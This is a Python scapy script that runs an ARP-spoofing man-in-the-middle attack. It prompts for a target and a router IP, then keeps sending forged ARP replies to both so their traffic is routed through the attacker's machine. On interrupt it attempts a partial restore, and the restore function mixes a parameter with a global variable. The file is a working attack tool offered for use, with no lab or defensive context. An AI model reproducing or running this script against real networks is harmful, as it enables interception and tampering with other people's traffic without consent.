import scapy.all as scapy
import time
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip,spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)
def restore(target_ip,router_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip, hwsrc=get_mac(router_ip))
    scapy.send(packet, count=4, verbose=False)
target_ip = input("Target Ip address:")
spoof_ip = input("Router Ip address:")
try:
    packets_count = 0
    while True:
        spoof(target_ip,spoof_ip)
        spoof(spoof_ip,target_ip)
        packets_count = packets_count+2
        print("\rSent Packets:"+str(packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nQuitting.........................")
    restore(target_ip,spoof_ip)